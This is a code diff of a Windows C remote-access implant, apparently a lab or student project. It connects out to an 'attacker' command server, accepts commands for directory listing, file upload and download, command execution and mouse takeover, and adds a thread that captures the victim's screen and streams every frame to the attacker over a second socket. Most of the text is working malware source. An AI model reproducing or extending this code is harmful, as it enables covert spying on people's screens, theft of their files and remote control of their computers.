@@ -1,17 +1,19 @@
 #define _WINSOCK_DEPRECATED_NO_WARNINGS // TODO - fix this
 
-//#include <windows.h> // is this needed?
 #include <winsock2.h> // windows socket header
 #include <shlwapi.h> // useful functions for directory traversal
 #include <stdio.h> // standard input/output
 #include <string.h> // useful string functions
+#include <windows.h> // might already by included from other includes
 
 #pragma comment(lib,"ws2_32.lib") // tell the linker to link the winsock library
 #pragma comment(lib, "Shlwapi.lib")
 
 // attacker IP and primary communication port
-#define CMD_SERVER_ADDR "127.0.0.1"
+//#define CMD_SERVER_ADDR "127.0.0.1"
+#define CMD_SERVER_ADDR "192.168.56.1"
 #define CMD_SERVER_PORT 8080
+#define VIDEO_PORT 8081
 
 // change directory and list directory contents
 #define CHANGE_DIR 1
@@ -40,6 +42,12 @@
 // define useful globals
 char currDir[MAX_PATH]; // name of the current directory
 SOCKET mainSock; // main socket used to receive commands and send info
+SOCKET videoSock; // socket used to send video data to attacker server
+int videoOn = 0; // boolean for whether the video stream is running
+HANDLE videoThread; // handle for thread that sends video to attacker
+
+DWORD WINAPI test(void* data);
+void connectToVideo();
 
 // helper function for exiting on error
 void exitOnError() {
@@ -196,13 +204,21 @@ char handleCommand(char* buffer) {
 		printf("Running \"%s\" from command prompt\n", buffer);
 		//runCommandPrompt(buffer);
 	} else if (cmd == START_VIDEO) {
-		printf("Starting video stream...\n");
-		// get the port to connect to
-		int port = (buffer[1] * 256) + buffer[2];
-		printf("Streaming video to attacker on port %d\n", port);
-		//streamVideo(port);
+		if (videoOn == 0) {
+			printf("Starting video stream...\n");
+			// get the port to connect to
+			//int port = (buffer[1] * 256) + buffer[2];
+			printf("Streaming video to attacker on port %d\n", VIDEO_PORT);
+			connectToVideo();
+			videoOn = 1;
+			videoThread = CreateThread(NULL, 0, test, NULL, 0, NULL);
+			//streamVideo(port);
+		}
+		else {
+			printf("Video already streaming\n");
+		}
 	} else if (cmd == END_VIDEO) {
-		// TODO - determine how best to stop video stream
+		videoOn = 0;
 	} else if (cmd == START_MOUSE) {
 		printf("Taking control of mouse...\n");
 		// get the port to connect to
@@ -284,16 +300,198 @@ void connectToCommandServer() {
 	// TODO - kill the connection gracefully
 }
 
+/*
+* Connect to the video socket
+*/
+void connectToVideo() {
+	struct sockaddr_in server;
+
+	// create the TCP socket
+	videoSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	if (videoSock == INVALID_SOCKET) {
+		printf("Could not create video socket: %d\n", WSAGetLastError());
+		return;
+	}
+
+	// set the server info structure
+	server.sin_addr.s_addr = inet_addr(CMD_SERVER_ADDR);
+	server.sin_family = AF_INET;
+	server.sin_port = htons(VIDEO_PORT);
+
+	// connect to the attacker command server
+	if (connect(videoSock, (struct sockaddr*)&server, sizeof(server)) != 0) {
+		printf("Could not connect to video server! Error code: %d\n", WSAGetLastError());
+		return;
+	}
+	else {
+		printf("Connected to video server\n");
+	}
+}
+
+// TODO - remove once done using
+int frames = 0;
+void videoStreamTest() {
+	// code modified from https://stackoverflow.com/questions/3291167/how-can-i-take-a-screenshot-in-a-windows-application
+	// get the device context of the screen
+	// DC contains drawing info
+	// technically a handle to a DC cuz the system hides everything from us
+	// once done using, call ReleaseDC(NULL, hScreenDC)
+	HDC hScreenDC = GetDC(NULL);
+	// and a device context to put it in
+	// a "memory DC" exists only in memory
+	// need to select a bitmap into the DC before it can be used
+	// this is done using CreateCompatibleBitmap()
+	// this specified the height, width, and color organization
+	// use DeleteDC to get rig of the DC once done using it
+	HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
+
+	// after ~5000 frames, this value drops to a massive negative number
+	// the 2's complement hex of this number is CCCCCCCC
+	int width = GetDeviceCaps(hScreenDC, HORZRES);
+	int height = GetDeviceCaps(hScreenDC, VERTRES);
+
+	// create a bitmap compatible with the screen HDC
+	// we can specify the width and height of the bitmap
+	// since this is for the screen, we use the screen width and height
+	// the color format/organization is selected automatically to match the screen DC
+	// the bitmap is "selected into" the screen DC
+	// delete this bitmap with DeleteObject() once done using it
+	HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
+
+	// select the screen-compitable bitmap into the memory DC
+	// this will allow us to use the memory DC
+	// the new bitmap returned replaces the old bitmap
+	// if an error occurs, this function return NULL (might want to check for that)
+	// might want to delete this bitmap once we're done using it?
+	HBITMAP holdBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
+
+	// do a bit blit from the screen DC to the memory DC
+	if (!BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY)) {
+		printf("Error: %d\n", GetLastError());
+	}
+
+	// draw the mouse cursor onto the image
+	// modified from https://stackoverflow.com/questions/1628919/capture-screen-shot-with-mouse-cursor
+	CURSORINFO cursor;
+	cursor.cbSize = sizeof(CURSORINFO);
+	if (!GetCursorInfo(&cursor)) {
+		printf("Error getting cursor info: %d\n", GetLastError());
+		return;
+	}
+	if (cursor.flags == CURSOR_SHOWING) {
+		ICONINFOEXA info;
+		info.cbSize = sizeof(ICONINFOEXA);
+		GetIconInfoExA(cursor.hCursor, &info);
+		int x = cursor.ptScreenPos.x - info.xHotspot;
+		int y = cursor.ptScreenPos.y - info.yHotspot;
+		BITMAP bmpCursor;
+		bmpCursor.bmType = 0;
+		GetObject(info.hbmColor, sizeof(bmpCursor), &bmpCursor);
+		DrawIconEx(hMemoryDC, x, y, cursor.hCursor, bmpCursor.bmWidth, bmpCursor.bmHeight,
+			0, NULL, DI_NORMAL);
+	}
+
+	// pull the bitmap out of the HDC memory
+	hBitmap = (HBITMAP)SelectObject(hMemoryDC, holdBitmap);
+
+	// clean up
+	DeleteDC(hMemoryDC);
+	DeleteDC(hScreenDC);
+	if (!DeleteObject(holdBitmap)) { // do we want to delete this???
+		printf("Could not delete holBitmap\n");
+	}
+
+	// now your image is held in hBitmap. You can save it or do whatever with it
+	
+	// code from https://stackoverflow.com/questions/22572849/c-how-to-send-hbitmap-over-socket
+	BITMAP Bmp;
+	BITMAPINFO Info;
+	HDC DC = CreateCompatibleDC(NULL);
+	HBITMAP OldBitmap = (HBITMAP)SelectObject(DC, hBitmap);
+	GetObject(hBitmap, sizeof(Bmp), &Bmp);
+
+	Info.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+	Info.bmiHeader.biWidth = width = Bmp.bmWidth;
+	Info.bmiHeader.biHeight = height = Bmp.bmHeight;
+	Info.bmiHeader.biPlanes = 1;
+	Info.bmiHeader.biBitCount = Bmp.bmBitsPixel;
+	Info.bmiHeader.biCompression = BI_RGB;
+	int fileSize = ((width * Bmp.bmBitsPixel + 31) / 32) * 4 * height;
+	Info.bmiHeader.biSizeImage = fileSize;
+
+	char * Pixels = malloc(Info.bmiHeader.biSizeImage);
+	char * pRev = malloc(Info.bmiHeader.biSizeImage);
+	GetDIBits(DC, hBitmap, 0, height, &Pixels[0], &Info, DIB_RGB_COLORS);
+	SelectObject(DC, OldBitmap);
+	//height = height < 0 ? -height : height;
+	DeleteDC(DC);
+	
+	// send data
+	int bytesToSend = fileSize;
+	int bytesSent = 0;
+	int retCode;
+	int repeats = 0;
+
+	// send frame info (width, height, size) before frame data
+	int buff[3];
+	buff[0] = width;
+	buff[1] = height;
+	buff[2] = fileSize;
+	retCode = send(videoSock, buff, 12, 0);
+	if (retCode == SOCKET_ERROR) {
+		printf("Could not send data: %d\n", WSAGetLastError());
+		return;
+	}
+
+	// print the size of the bitmap for the current frame - used for debug
+	printf("Frame %d x & y: %d x %d\n", frames++, width, height);
+
+	// vertically flip the image - just something with how the screen capture works
+	for (int row = 0; row < height; row++) {
+		for (int b = 0; b < width * 4; b++) {
+			int idx = ((height - row - 1) * width * 4) + b;
+			int rIdx = (row * width * 4) + b;
+			pRev[rIdx] = Pixels[idx];
+		}
+	}
+
+	// swap the red and blue bytes (seems to be a problem on this side)
+	// TODO - why exactly does this happen???
+	for (int i = 0; i < fileSize; i += 4) {
+		char temp = pRev[i];
+		pRev[i] = pRev[i + 2];
+		pRev[i + 2] = temp;
+	}
+
+	// loop until all data is sent
+	do {
+		retCode = send(videoSock, pRev, bytesToSend - bytesSent, 0);
+		if (retCode == SOCKET_ERROR) {
+			printf("Could not send data: %d\n", WSAGetLastError());
+			return;
+		}
+		bytesSent += retCode;
+		if (bytesSent < bytesToSend) { // we need to loop again
+			printf("Could not send all data in one attempt! Looping to send remaining data...\n");
+			memmove(Pixels, (char*)(pRev + bytesSent), bytesToSend - retCode);
+			repeats++;
+		}
+	} while (bytesSent < bytesToSend + repeats);
+
+	free(Pixels);
+	free(pRev);
+	if (!DeleteObject(hBitmap)) { // do we want to delete this???
+		printf("Could not delete hBitmap\n");
+	}
+}
+
 // TODO - remove testing function once no longer needed
-void test() {
-	char buffer[] = { CHANGE_DIR, 'C', ':', '\\', 'U', 's', 'e', 'r', 's', '\0' };
-	handleCommand(buffer);
-	char buffer2[] = {LIST_DIR, 'D', '\0' };
-	handleCommand(buffer2);
-	char buffer3[] = { UPLOAD, 127, 35, 'w', 'a', 'l', 'l', '.', 'p', 'n', 'g', '\0' };
-	handleCommand(buffer3);
-	char buffer4[] = { DOWNLOAD, 127, 35, 'w', 'a', 'l', 'l', '.', 'p', 'n', 'g', '\0' };
-	handleCommand(buffer4);
+// currently testing video streaming to attacker server
+DWORD WINAPI test(void* data) {
+	while (videoOn == 1) {
+		videoStreamTest();
+		Sleep(33);
+	}
 }
 
 int main(int argc, char* argv[]) {
